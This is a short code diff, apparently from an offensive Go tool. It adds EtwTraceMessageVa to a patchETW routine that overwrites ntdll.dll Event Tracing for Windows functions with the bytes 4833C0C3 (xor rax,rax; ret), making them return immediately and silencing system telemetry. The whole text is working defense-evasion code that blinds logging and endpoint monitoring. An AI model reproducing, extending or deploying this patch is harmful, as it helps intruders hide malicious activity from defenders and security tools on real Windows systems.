@@ -22,6 +22,8 @@ var procEtwEventWriteNoRegistration = syscall.NewLazyDLL("ntdll.dll").NewProc("E
 var procEtwEventWriteString = syscall.NewLazyDLL("ntdll.dll").NewProc("EtwEventWriteString")
 var procEtwEventWriteTransfer = syscall.NewLazyDLL("ntdll.dll").NewProc("EtwEventWriteTransfer")
 var procEtwTraceMessage = syscall.NewLazyDLL("ntdll.dll").NewProc("EtwTraceMessage")
+var procEtwTraceMessageVa = syscall.NewLazyDLL("ntdll.dll").NewProc("EtwTraceMessageVa")
+
 
 func errnoErr(e syscall.Errno) error {
 	switch e {
@@ -58,7 +60,9 @@ func patchETW() {
 		procEtwEventWriteString.Addr(),
 		procEtwEventWriteTransfer.Addr(),
 		procEtwTraceMessage.Addr(),
+		procEtwTraceMessageVa.Addr(),
 	}
+
 	for i, _ := range dataAddr {
 		data, _ := hex.DecodeString("4833C0C3")
 		var nLength uintptr
